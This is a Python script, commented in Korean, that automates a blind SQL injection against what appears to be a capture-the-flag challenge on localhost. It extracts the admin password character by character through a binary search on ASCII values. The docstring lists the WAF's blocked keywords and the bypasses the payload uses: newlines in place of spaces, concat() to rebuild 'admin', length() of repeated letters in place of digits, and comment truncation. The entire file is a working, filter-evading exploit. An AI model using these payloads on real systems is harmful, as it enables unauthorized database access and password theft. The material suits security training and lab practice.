#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""sqli-3 (Blind) 자동 추출 — admin 비밀번호(=flag)를 한 글자씩 복원.
WAF 차단: or|union|admin|숫자|공백|- 등.
우회: 공백=%0a(LF), admin=concat('ad','min'), 숫자=length('aaa..'), 비교=ascii() 이진탐색.
오라클: 응답에 'Hello admin' 포함 여부.

사용:  python sqli3_blind.py            # 기본 http://localhost:9203
       python sqli3_blind.py http://localhost:9203
"""
import urllib.request, urllib.parse, sys

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9203").rstrip("/")

def oracle(pos, num):
    # ascii(substr(userpw, pos, 1)) > num   (pos,num 은 length('a'*k) 로 표현)
    cond = "ascii(substr(userpw,length('%s'),true))>length('%s')" % ("a"*pos, "a"*num)
    payload = "a'='a'#\nand\nuserid=concat('ad','min')#\nand\n%s#" % cond
    qs = urllib.parse.urlencode({"userid": payload, "userpw": "x"})
    with urllib.request.urlopen(BASE + "/?" + qs, timeout=10) as r:
        return "Hello admin" in r.read().decode("utf-8", "replace")

def main():
    flag = ""
    for pos in range(1, 48):
        lo, hi = 31, 127
        while lo < hi:                       # 이진탐색
            mid = (lo + hi) // 2
            if oracle(pos, mid): lo = mid + 1
            else: hi = mid
        ch = chr(lo); flag += ch
        print("pos %2d -> %r   so far: %s" % (pos, ch, flag), flush=True)
        if ch == "}": break
    print("\n[+] RECOVERED:", flag)

if __name__ == "__main__":
    main()
